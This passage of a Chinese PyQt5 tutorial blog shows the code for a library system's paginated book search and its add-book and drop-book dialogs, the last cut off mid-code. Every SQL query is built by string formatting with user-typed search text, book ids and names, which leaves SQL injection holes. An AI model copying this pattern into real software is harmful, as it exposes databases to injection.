    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>从数据库的设计可以看到，在这里我们只需要使用Book表的数据，就可以实现书籍信息的查询了</p><p>在这个功能的实现上，可以说花了我比较大的心思了，主要实现了这些功能：</p><ul><li>动态刷新，也就是说当管理员删除或者添加书籍，用户借阅归还书籍的时候动态刷新这个TableView</li><li>模糊匹配</li><li>按书名，作者，书号，出版社查询</li><li>跳转页，翻页</li></ul><a id="more"></a><h2><span id="pdai-ma-shi-xian">代码实现</span><a href="#pdai-ma-shi-xian" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import Qt</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BookStorageViewer(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(BookStorageViewer, self).__init__()</span><br><span class="line">        self.resize(700, 500)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        # 查询模型</span><br><span class="line">        self.queryModel &#x3D; None</span><br><span class="line">        # 数据表</span><br><span class="line">        self.tableView &#x3D; None</span><br><span class="line">        # 当前页</span><br><span class="line">        self.currentPage &#x3D; 0</span><br><span class="line">        # 总页数</span><br><span class="line">        self.totalPage &#x3D; 0</span><br><span class="line">        # 总记录数</span><br><span class="line">        self.totalRecord &#x3D; 0</span><br><span class="line">        # 每页数据数</span><br><span class="line">        self.pageRecord &#x3D; 10</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.layout &#x3D; QVBoxLayout()</span><br><span class="line">        self.Hlayout1 &#x3D; QHBoxLayout()</span><br><span class="line">        self.Hlayout2 &#x3D; QHBoxLayout()</span><br><span class="line"></span><br><span class="line">        # Hlayout1控件的初始化</span><br><span class="line">        self.searchEdit &#x3D; QLineEdit()</span><br><span class="line">        self.searchEdit.setFixedHeight(32)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(15)</span><br><span class="line">        self.searchEdit.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.searchButton &#x3D; QPushButton(&quot;查询&quot;)</span><br><span class="line">        self.searchButton.setFixedHeight(32)</span><br><span class="line">        self.searchButton.setFont(font)</span><br><span class="line">        self.searchButton.setIcon(QIcon(QPixmap(&quot;.&#x2F;images&#x2F;search.png&quot;)))</span><br><span class="line"></span><br><span class="line">        self.condisionComboBox &#x3D; QComboBox()</span><br><span class="line">        searchCondision &#x3D; [&#39;按书名查询&#39;, &#39;按书号查询&#39;, &#39;按作者查询&#39;, &#39;按分类查询&#39;, &#39;按出版社查询&#39;]</span><br><span class="line">        self.condisionComboBox.setFixedHeight(32)</span><br><span class="line">        self.condisionComboBox.setFont(font)</span><br><span class="line">        self.condisionComboBox.addItems(searchCondision)</span><br><span class="line"></span><br><span class="line">        self.Hlayout1.addWidget(self.searchEdit)</span><br><span class="line">        self.Hlayout1.addWidget(self.searchButton)</span><br><span class="line">        self.Hlayout1.addWidget(self.condisionComboBox)</span><br><span class="line"></span><br><span class="line">        # Hlayout2初始化</span><br><span class="line">        self.jumpToLabel &#x3D; QLabel(&quot;跳转到第&quot;)</span><br><span class="line">        self.pageEdit &#x3D; QLineEdit()</span><br><span class="line">        self.pageEdit.setFixedWidth(30)</span><br><span class="line">        s &#x3D; &quot;&#x2F;&quot; + str(self.totalPage) + &quot;页&quot;</span><br><span class="line">        self.pageLabel &#x3D; QLabel(s)</span><br><span class="line">        self.jumpToButton &#x3D; QPushButton(&quot;跳转&quot;)</span><br><span class="line">        self.prevButton &#x3D; QPushButton(&quot;前一页&quot;)</span><br><span class="line">        self.prevButton.setFixedWidth(60)</span><br><span class="line">        self.backButton &#x3D; QPushButton(&quot;后一页&quot;)</span><br><span class="line">        self.backButton.setFixedWidth(60)</span><br><span class="line"></span><br><span class="line">        Hlayout &#x3D; QHBoxLayout()</span><br><span class="line">        Hlayout.addWidget(self.jumpToLabel)</span><br><span class="line">        Hlayout.addWidget(self.pageEdit)</span><br><span class="line">        Hlayout.addWidget(self.pageLabel)</span><br><span class="line">        Hlayout.addWidget(self.jumpToButton)</span><br><span class="line">        Hlayout.addWidget(self.prevButton)</span><br><span class="line">        Hlayout.addWidget(self.backButton)</span><br><span class="line">        widget &#x3D; QWidget()</span><br><span class="line">        widget.setLayout(Hlayout)</span><br><span class="line">        widget.setFixedWidth(300)</span><br><span class="line">        self.Hlayout2.addWidget(widget)</span><br><span class="line"></span><br><span class="line">        # tableView</span><br><span class="line">        # 序号，书名，书号，作者，分类，出版社，出版时间，库存，剩余可借</span><br><span class="line">        self.db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        self.db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        self.db.open()</span><br><span class="line">        self.tableView &#x3D; QTableView()</span><br><span class="line">        self.tableView.horizontalHeader().setStretchLastSection(True)</span><br><span class="line">        self.tableView.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        self.tableView.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line">        self.queryModel &#x3D; QSqlQueryModel()</span><br><span class="line">        self.searchButtonClicked()</span><br><span class="line">        self.tableView.setModel(self.queryModel)</span><br><span class="line"></span><br><span class="line">        self.queryModel.setHeaderData(0, Qt.Horizontal, &quot;书名&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(1, Qt.Horizontal, &quot;书号&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(2, Qt.Horizontal, &quot;作者&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(3, Qt.Horizontal, &quot;分类&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(4, Qt.Horizontal, &quot;出版社&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(5, Qt.Horizontal, &quot;出版时间&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(6, Qt.Horizontal, &quot;库存&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(7, Qt.Horizontal, &quot;剩余可借&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(8, Qt.Horizontal, &quot;总借阅次数&quot;)</span><br><span class="line"></span><br><span class="line">        self.layout.addLayout(self.Hlayout1)</span><br><span class="line">        self.layout.addWidget(self.tableView)</span><br><span class="line">        self.layout.addLayout(self.Hlayout2)</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line">        self.searchButton.clicked.connect(self.searchButtonClicked)</span><br><span class="line">        self.prevButton.clicked.connect(self.prevButtonClicked)</span><br><span class="line">        self.backButton.clicked.connect(self.backButtonClicked)</span><br><span class="line">        self.jumpToButton.clicked.connect(self.jumpToButtonClicked)</span><br><span class="line">        self.searchEdit.returnPressed.connect(self.searchButtonClicked)</span><br><span class="line"></span><br><span class="line">    def setButtonStatus(self):</span><br><span class="line">        if(self.currentPage&#x3D;&#x3D;self.totalPage):</span><br><span class="line">            self.prevButton.setEnabled(True)</span><br><span class="line">            self.backButton.setEnabled(False)</span><br><span class="line">        if(self.currentPage&#x3D;&#x3D;1):</span><br><span class="line">            self.backButton.setEnabled(True)</span><br><span class="line">            self.prevButton.setEnabled(False)</span><br><span class="line">        if(self.currentPage&lt;self.totalPage and self.currentPage&gt;1):</span><br><span class="line">            self.prevButton.setEnabled(True)</span><br><span class="line">            self.backButton.setEnabled(True)</span><br><span class="line"></span><br><span class="line">    # 得到记录数</span><br><span class="line">    def getTotalRecordCount(self):</span><br><span class="line">        self.queryModel.setQuery(&quot;SELECT * FROM Book&quot;)</span><br><span class="line">        self.totalRecord &#x3D; self.queryModel.rowCount()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 得到总页数</span><br><span class="line">    def getPageCount(self):</span><br><span class="line">        self.getTotalRecordCount()</span><br><span class="line">        # 上取整</span><br><span class="line">        self.totalPage &#x3D; int((self.totalRecord + self.pageRecord - 1) &#x2F; self.pageRecord)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 分页记录查询</span><br><span class="line">    def recordQuery(self, index):</span><br><span class="line">        queryCondition &#x3D; &quot;&quot;</span><br><span class="line">        conditionChoice &#x3D; self.condisionComboBox.currentText()</span><br><span class="line">        if (conditionChoice &#x3D;&#x3D; &quot;按书名查询&quot;):</span><br><span class="line">            conditionChoice &#x3D; &#39;BookName&#39;</span><br><span class="line">        elif (conditionChoice &#x3D;&#x3D; &quot;按书号查询&quot;):</span><br><span class="line">            conditionChoice &#x3D; &#39;BookId&#39;</span><br><span class="line">        elif (conditionChoice &#x3D;&#x3D; &quot;按作者查询&quot;):</span><br><span class="line">            conditionChoice &#x3D; &#39;Auth&#39;</span><br><span class="line">        elif (conditionChoice &#x3D;&#x3D; &#39;按分类查询&#39;):</span><br><span class="line">            conditionChoice &#x3D; &#39;Category&#39;</span><br><span class="line">        else:</span><br><span class="line">            conditionChoice &#x3D; &#39;Publisher&#39;</span><br><span class="line"></span><br><span class="line">        if (self.searchEdit.text() &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            queryCondition &#x3D; &quot;select * from Book&quot;</span><br><span class="line">            self.queryModel.setQuery(queryCondition)</span><br><span class="line">            self.totalRecord &#x3D; self.queryModel.rowCount()</span><br><span class="line">            self.totalPage &#x3D; int((self.totalRecord + self.pageRecord - 1) &#x2F; self.pageRecord)</span><br><span class="line">            label &#x3D; &quot;&#x2F;&quot; + str(int(self.totalPage)) + &quot;页&quot;</span><br><span class="line">            self.pageLabel.setText(label)</span><br><span class="line">            queryCondition &#x3D; (&quot;select * from Book ORDER BY %s  limit %d,%d &quot; % (conditionChoice,index, self.pageRecord))</span><br><span class="line">            self.queryModel.setQuery(queryCondition)</span><br><span class="line">            self.setButtonStatus()</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        # 得到模糊查询条件</span><br><span class="line">        temp &#x3D; self.searchEdit.text()</span><br><span class="line">        s &#x3D; &#39;%&#39;</span><br><span class="line">        for i in range(0, len(temp)):</span><br><span class="line">            s &#x3D; s + temp[i] + &quot;%&quot;</span><br><span class="line">        queryCondition &#x3D; (&quot;SELECT * FROM Book WHERE %s LIKE &#39;%s&#39; ORDER BY %s &quot; % (</span><br><span class="line">            conditionChoice, s,conditionChoice))</span><br><span class="line">        self.queryModel.setQuery(queryCondition)</span><br><span class="line">        self.totalRecord &#x3D; self.queryModel.rowCount()</span><br><span class="line">        # 当查询无记录时的操作</span><br><span class="line">        if(self.totalRecord&#x3D;&#x3D;0):</span><br><span class="line">            print(QMessageBox.information(self,&quot;提醒&quot;,&quot;查询无记录&quot;,QMessageBox.Yes,QMessageBox.Yes))</span><br><span class="line">            queryCondition &#x3D; &quot;select * from Book&quot;</span><br><span class="line">            self.queryModel.setQuery(queryCondition)</span><br><span class="line">            self.totalRecord &#x3D; self.queryModel.rowCount()</span><br><span class="line">            self.totalPage &#x3D; int((self.totalRecord + self.pageRecord - 1) &#x2F; self.pageRecord)</span><br><span class="line">            label &#x3D; &quot;&#x2F;&quot; + str(int(self.totalPage)) + &quot;页&quot;</span><br><span class="line">            self.pageLabel.setText(label)</span><br><span class="line">            queryCondition &#x3D; (&quot;select * from Book ORDER BY %s  limit %d,%d &quot; % (conditionChoice,index, self.pageRecord))</span><br><span class="line">            self.queryModel.setQuery(queryCondition)</span><br><span class="line">            self.setButtonStatus()</span><br><span class="line">            return</span><br><span class="line">        self.totalPage &#x3D; int((self.totalRecord + self.pageRecord - 1) &#x2F; self.pageRecord)</span><br><span class="line">        label &#x3D; &quot;&#x2F;&quot; + str(int(self.totalPage)) + &quot;页&quot;</span><br><span class="line">        self.pageLabel.setText(label)</span><br><span class="line">        queryCondition &#x3D; (&quot;SELECT * FROM Book WHERE %s LIKE &#39;%s&#39; ORDER BY %s LIMIT %d,%d &quot; % (</span><br><span class="line">            conditionChoice, s, conditionChoice,index, self.pageRecord))</span><br><span class="line">        self.queryModel.setQuery(queryCondition)</span><br><span class="line">        self.setButtonStatus()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 点击查询</span><br><span class="line">    def searchButtonClicked(self):</span><br><span class="line">        self.currentPage &#x3D; 1</span><br><span class="line">        self.pageEdit.setText(str(self.currentPage))</span><br><span class="line">        self.getPageCount()</span><br><span class="line">        s &#x3D; &quot;&#x2F;&quot; + str(int(self.totalPage)) + &quot;页&quot;</span><br><span class="line">        self.pageLabel.setText(s)</span><br><span class="line">        index &#x3D; (self.currentPage - 1) * self.pageRecord</span><br><span class="line">        self.recordQuery(index)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 向前翻页</span><br><span class="line">    def prevButtonClicked(self):</span><br><span class="line">        self.currentPage -&#x3D; 1</span><br><span class="line">        if (self.currentPage &lt;&#x3D; 1):</span><br><span class="line">            self.currentPage &#x3D; 1</span><br><span class="line">        self.pageEdit.setText(str(self.currentPage))</span><br><span class="line">        index &#x3D; (self.currentPage - 1) * self.pageRecord</span><br><span class="line">        self.recordQuery(index)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 向后翻页</span><br><span class="line">    def backButtonClicked(self):</span><br><span class="line">        self.currentPage +&#x3D; 1</span><br><span class="line">        if (self.currentPage &gt;&#x3D; int(self.totalPage)):</span><br><span class="line">            self.currentPage &#x3D; int(self.totalPage)</span><br><span class="line">        self.pageEdit.setText(str(self.currentPage))</span><br><span class="line">        index &#x3D; (self.currentPage - 1) * self.pageRecord</span><br><span class="line">        self.recordQuery(index)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 点击跳转</span><br><span class="line">    def jumpToButtonClicked(self):</span><br><span class="line">        if (self.pageEdit.text().isdigit()):</span><br><span class="line">            self.currentPage &#x3D; int(self.pageEdit.text())</span><br><span class="line">            if (self.currentPage &gt; self.totalPage):</span><br><span class="line">                self.currentPage &#x3D; self.totalPage</span><br><span class="line">            if (self.currentPage &lt;&#x3D; 1):</span><br><span class="line">                self.currentPage &#x3D; 1</span><br><span class="line">        else:</span><br><span class="line">            self.currentPage &#x3D; 1</span><br><span class="line">        index &#x3D; (self.currentPage - 1) * self.pageRecord</span><br><span class="line">        self.pageEdit.setText(str(self.currentPage))</span><br><span class="line">        self.recordQuery(index)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; BookStorageViewer()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h2><span id="pdai-ma-fen-xi">代码分析</span><a href="#pdai-ma-fen-xi" class="header-anchor">#</a></h2><ul><li>主要使用了 Qt自带的<code>QTableView</code>和<code>QSqlQueryModel</code>实现了查询和展示结果</li><li>也有得到记录数，总页数，点击查询，跳转，前一页，后一页的函数，这些都很好看懂，同时还设置了按钮的可用性</li><li>分页记录查询函数是这里面最主要的一个函数，首先看查询种类 ，分别有判断为空 ，模糊查询，查询无果的处理</li><li>在跳转前有对输入数据的检测合法与否</li></ul><blockquote><p>这里还没有实现动态刷新，因为这个功能是用其他部件信号传输实现的</p></blockquote><h2><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h2><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8zx44e8j30iv0f2q3y.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8zxv2mdj30it0ergmh.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8zyau3bj30iv0ezgme.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（5）——添加/淘汰书籍对话框设计</title>
    <url>/65cd36fc.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析：</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>在图书管管理系统主页上，我们有添加和淘汰的功能 ，通过按钮弹出对话框进行添加和淘汰书籍，这里我们就来完成一下这两个功能。</p><a id="more"></a><h2><span id="ptian-jia-tu-shu-gong-neng">添加图书功能</span><a href="#ptian-jia-tu-shu-gong-neng" class="header-anchor">#</a></h2><blockquote><p>添加图书，需要管理员添加以下信息</p></blockquote><ul><li>书名</li><li>书号</li><li>作者名</li><li>分类（分类已经规定，只需要选择对应的种类就可以了）</li><li>出版社</li><li>出版日期</li><li>添加的数量</li></ul><h3><span id="ptian-jia-tu-shu-dui-hua-kuang-dai-ma">添加图书对话框代码</span><a href="#ptian-jia-tu-shu-dui-hua-kuang-dai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import time</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class addBookDialog(QDialog):</span><br><span class="line">    add_book_success_signal &#x3D; pyqtSignal()</span><br><span class="line"></span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(addBookDialog, self).__init__(parent)</span><br><span class="line">        self.setUpUI()</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;添加书籍&quot;)</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 书名，书号，作者，分类，添加数量.出版社,出版日期</span><br><span class="line">        # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类</span><br><span class="line">        BookCategory &#x3D; [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot;</span><br><span class="line">            , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;]</span><br><span class="line">        self.resize(300, 400)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        # Label控件</span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot;  添加书籍&quot;)</span><br><span class="line">        self.bookNameLabel &#x3D; QLabel(&quot;书    名:&quot;)</span><br><span class="line">        self.bookIdLabel &#x3D; QLabel(&quot;书    号:&quot;)</span><br><span class="line">        self.authNameLabel &#x3D; QLabel(&quot;作    者:&quot;)</span><br><span class="line">        self.categoryLabel &#x3D; QLabel(&quot;分    类:&quot;)</span><br><span class="line">        self.publisherLabel &#x3D; QLabel(&quot;出 版 社:&quot;)</span><br><span class="line">        self.publishDateLabel &#x3D; QLabel(&quot;出版日期:&quot;)</span><br><span class="line">        self.addNumLabel &#x3D; QLabel(&quot;数    量:&quot;)</span><br><span class="line"></span><br><span class="line">        # button控件</span><br><span class="line">        self.addBookButton &#x3D; QPushButton(&quot;添 加&quot;)</span><br><span class="line"></span><br><span class="line">        # lineEdit控件</span><br><span class="line">        self.bookNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.bookIdEdit &#x3D; QLineEdit()</span><br><span class="line">        self.authNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.categoryComboBox &#x3D; QComboBox()</span><br><span class="line">        self.categoryComboBox.addItems(BookCategory)</span><br><span class="line">        self.publisherEdit &#x3D; QLineEdit()</span><br><span class="line">        self.publishTime &#x3D; QDateTimeEdit()</span><br><span class="line">        self.publishTime.setDisplayFormat(&quot;yyyy-MM-dd&quot;)</span><br><span class="line">        # self.publishDateEdit &#x3D; QLineEdit()</span><br><span class="line">        self.addNumEdit &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setMaxLength(10)</span><br><span class="line">        self.bookIdEdit.setMaxLength(6)</span><br><span class="line">        self.authNameEdit.setMaxLength(10)</span><br><span class="line">        self.publisherEdit.setMaxLength(10)</span><br><span class="line">        self.addNumEdit.setMaxLength(12)</span><br><span class="line">        self.addNumEdit.setValidator(QIntValidator())</span><br><span class="line"></span><br><span class="line">        # 添加进formlayout</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.bookNameLabel, self.bookNameEdit)</span><br><span class="line">        self.layout.addRow(self.bookIdLabel, self.bookIdEdit)</span><br><span class="line">        self.layout.addRow(self.authNameLabel, self.authNameEdit)</span><br><span class="line">        self.layout.addRow(self.categoryLabel, self.categoryComboBox)</span><br><span class="line">        self.layout.addRow(self.publisherLabel, self.publisherEdit)</span><br><span class="line">        self.layout.addRow(self.publishDateLabel, self.publishTime)</span><br><span class="line">        self.layout.addRow(self.addNumLabel, self.addNumEdit)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.addBookButton)</span><br><span class="line"></span><br><span class="line">        # 设置字体</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        self.bookNameLabel.setFont(font)</span><br><span class="line">        self.bookIdLabel.setFont(font)</span><br><span class="line">        self.authNameLabel.setFont(font)</span><br><span class="line">        self.categoryLabel.setFont(font)</span><br><span class="line">        self.publisherLabel.setFont(font)</span><br><span class="line">        self.publishDateLabel.setFont(font)</span><br><span class="line">        self.addNumLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setFont(font)</span><br><span class="line">        self.bookIdEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setFont(font)</span><br><span class="line">        self.publisherEdit.setFont(font)</span><br><span class="line">        self.publishTime.setFont(font)</span><br><span class="line">        self.categoryComboBox.setFont(font)</span><br><span class="line">        self.addNumEdit.setFont(font)</span><br><span class="line"></span><br><span class="line">        # button设置</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.addBookButton.setFont(font)</span><br><span class="line">        self.addBookButton.setFixedHeight(32)</span><br><span class="line">        self.addBookButton.setFixedWidth(140)</span><br><span class="line"></span><br><span class="line">        # 设置间距</span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line"></span><br><span class="line">        self.addBookButton.clicked.connect(self.addBookButtonCicked)</span><br><span class="line"></span><br><span class="line">    def addBookButtonCicked(self):</span><br><span class="line">        bookName &#x3D; self.bookNameEdit.text()</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        authName &#x3D; self.authNameEdit.text()</span><br><span class="line">        bookCategory &#x3D; self.categoryComboBox.currentText()</span><br><span class="line">        publisher &#x3D; self.publisherEdit.text()</span><br><span class="line">        publishTime &#x3D; self.publishTime.text()</span><br><span class="line">        addBookNum &#x3D; self.addNumEdit.text()</span><br><span class="line">        if (</span><br><span class="line">                bookName &#x3D;&#x3D; &quot;&quot; or bookId &#x3D;&#x3D; &quot;&quot; or authName &#x3D;&#x3D; &quot;&quot; or bookCategory &#x3D;&#x3D; &quot;&quot; or publisher &#x3D;&#x3D; &quot;&quot; or publishTime &#x3D;&#x3D; &quot;&quot; or addBookNum &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;有字段为空，添加失败&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        else:</span><br><span class="line">            addBookNum &#x3D; int(addBookNum)</span><br><span class="line">            db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">            db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">            db.open()</span><br><span class="line">            query &#x3D; QSqlQuery()</span><br><span class="line">            # 如果已存在，则update Book表的现存量，剩余可借量，不存在，则insert Book表，同时insert buyordrop表</span><br><span class="line">            sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">            query.exec_(sql)</span><br><span class="line">            if (query.next()):</span><br><span class="line">                sql &#x3D; &quot;UPDATE Book SET NumStorage&#x3D;NumStorage+%d,NumCanBorrow&#x3D;NumCanBorrow+%d WHERE BookId&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                    addBookNum, addBookNum, bookId)</span><br><span class="line">            else:</span><br><span class="line">                sql &#x3D; &quot;INSERT INTO book VALUES (&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,%d,%d,0)&quot; % (</span><br><span class="line">                    bookName, bookId, authName, bookCategory, publisher, publishTime, addBookNum, addBookNum)</span><br><span class="line">            query.exec_(sql)</span><br><span class="line">            db.commit()</span><br><span class="line">            # 插入droporinsert表</span><br><span class="line">            timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">            sql &#x3D; &quot;INSERT INTO buyordrop VALUES (&#39;%s&#39;,&#39;%s&#39;,1,%d)&quot; % (bookId, timenow, addBookNum)</span><br><span class="line">            query.exec_(sql)</span><br><span class="line">            db.commit()</span><br><span class="line">            print(QMessageBox.information(self, &quot;提示&quot;, &quot;添加书籍成功!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            self.add_book_success_signal.emit()</span><br><span class="line">            self.close()</span><br><span class="line">            self.clearEdit()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def clearEdit(self):</span><br><span class="line">        self.bookNameEdit.clear()</span><br><span class="line">        self.bookIdEdit.clear()</span><br><span class="line">        self.authNameEdit.clear()</span><br><span class="line">        self.addNumEdit.clear()</span><br><span class="line">        self.publisherEdit.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; addBookDialog()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><p>对于分类，使用了 <code>QComboBox</code><br>对于时间，选择了<code>QDateTimeEdit</code>，并且规定了时间的格式<br>在<code>setUpUI</code>中可以看到，当点击<strong>添加图书</strong>按钮时<code>addBookButtonClicked</code>函数</p><h3><span id="paddbookbuttonclicked-han-shu-shi-xian-luo-ji">addBookButtonClicked函数实现逻辑</span><a href="#paddbookbuttonclicked-han-shu-shi-xian-luo-ji" class="header-anchor">#</a></h3><p>虽然我注释了，但是这里还是想重新写一下，逻辑如下</p><ul><li>如果存在有空值，警告</li><li>添加的书已存在，就直接加上本数</li><li>本来不存在，则开始插入数据</li></ul><h3><span id="pshi-xian-xiao-guo">实现效果:</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8v90r9pj308b0c1dfs.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8v9u8t2j308d0c2wek.jpg" alt="这里写图片描述"></p><h2><span id="ptao-tai-tu-shu-gong-neng">淘汰图书功能</span><a href="#ptao-tai-tu-shu-gong-neng" class="header-anchor">#</a></h2><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>从实现看与添加图书差不多，但是为了方便，我只允许管理员添加书本号，然后自动匹配到书籍信息填充，管理员只需再添加一个淘汰数量就行了</p><h3><span id="pdai-ma">代码</span><a href="#pdai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class dropBookDialog(QDialog):</span><br><span class="line">    drop_book_successful_signal&#x3D;pyqtSignal()</span><br><span class="line"></span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(dropBookDialog, self).__init__(parent)</span><br><span class="line">        self.setUpUI()</span><br><span class="line">        